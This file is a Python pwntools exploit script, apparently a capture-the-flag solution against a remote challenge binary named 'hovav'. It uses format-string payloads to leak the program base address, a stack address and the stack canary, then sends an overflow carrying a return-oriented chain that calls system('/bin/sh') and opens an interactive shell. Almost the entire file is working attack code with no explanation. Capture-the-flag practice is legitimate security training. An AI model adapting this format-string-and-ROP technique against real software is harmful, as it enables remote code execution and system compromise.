#!/usr/bin/env python
# coding=utf-8

from pwn import *
from pwn import logging

context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']
context(arch = "amd64", os = "linux")

DEBUG = False
LOCAL = False

def debug(p):
    if DEBUG:
        gdbscript = """
            b *0x55555555525d
            b *0x5555555552a1
            c
        """
        gdb.attach(p, gdbscript = gdbscript)

if LOCAL:
    p = process("./hovav", aslr = (not DEBUG))
else:
    p = remote("oakland40ctf.epfl.ch", 40003)

debug(p)

p.recvuntil("Give me your input. Enter RET to return");


p.recvuntil("I'll give you a shot: ")
payload = "%19$p".ljust(8, "\x00")
p.sendline(payload);
p.recvuntil("Did this work> ")
pie = int(p.recvline().strip(), 16)
print "PIE: %#x" % pie
call_system = pie + 0x7
print "CALL SYSTEM: %#x" % call_system
pop_rdi = pie - 0x14e
print "POP RDI: %#x" % pop_rdi
bin_sh = pie + 0xcdc
print "BINSH: %#x" % bin_sh

p.recvuntil("I'll give you a shot: ")
payload = "%18$p".ljust(8, "\x00")
p.sendline(payload);
p.recvuntil("Did this work> ")
aslr = int(p.recvline().strip(), 16)
print "ASLR: %#x" % aslr
ret_addr = aslr - 8
print "RET_ADDR: %#x" % ret_addr

p.recvuntil("I'll give you a shot: ")
payload = "%17$p".ljust(8, "\x00")
p.sendline(payload);
p.recvuntil("Did this work> ")
canary = int(p.recvline().strip(), 16)
print "CANARY: %#x" % canary

p.recvuntil("I'll give you a shot: ")
payload = "z" * 0x58 + p64(canary) + p64(aslr) + p64(pop_rdi) + p64(bin_sh) + p64(call_system) * 2
p.sendline(payload);
p.recvuntil("Did this work> ")

p.recvuntil("I'll give you a shot: ")
p.sendline("RET");
p.recvuntil("Did this work> ")

p.interactive()
